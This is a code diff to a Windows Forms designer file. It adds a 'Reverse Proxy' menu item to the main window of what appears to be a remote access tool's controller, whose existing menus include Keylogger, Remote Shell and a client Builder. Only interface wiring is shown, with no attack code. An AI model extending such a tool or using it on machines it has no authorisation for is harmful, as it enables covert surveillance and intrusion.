@@ -79,6 +79,7 @@ namespace xServer.Forms
             this.menuBuilder = new System.Windows.Forms.MenuItem();
             this.menuStatistics = new System.Windows.Forms.MenuItem();
             this.menuAbout = new System.Windows.Forms.MenuItem();
+            this.ctxtReverseProxy = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtMenu.SuspendLayout();
             this.botStrip.SuspendLayout();
             this.SuspendLayout();
@@ -145,6 +146,7 @@ namespace xServer.Forms
             this.ctxtStartupManager,
             this.ctxtTaskManager,
             this.ctxtRemoteShell,
+            this.ctxtReverseProxy,
             this.ctxtLine,
             this.ctxtActions});
             this.ctxtSystem.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSystem.Image")));
@@ -708,6 +710,13 @@ namespace xServer.Forms
             this.menuAbout.Text = "About";
             this.menuAbout.Click += new System.EventHandler(this.menuAbout_Click);
             // 
+            // ctxtReverseProxy
+            // 
+            this.ctxtReverseProxy.Name = "ctxtReverseProxy";
+            this.ctxtReverseProxy.Size = new System.Drawing.Size(178, 22);
+            this.ctxtReverseProxy.Text = "Reverse Proxy";
+            this.ctxtReverseProxy.Click += new System.EventHandler(this.ctxtReverseProxy_Click);
+            // 
             // FrmMain
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -781,6 +790,7 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem ctxtLocalFile;
         private System.Windows.Forms.ToolStripMenuItem ctxtWebFile;
         private System.Windows.Forms.ToolStripMenuItem ctxtKeylogger;
+        private System.Windows.Forms.ToolStripMenuItem ctxtReverseProxy;
     }
 }
 
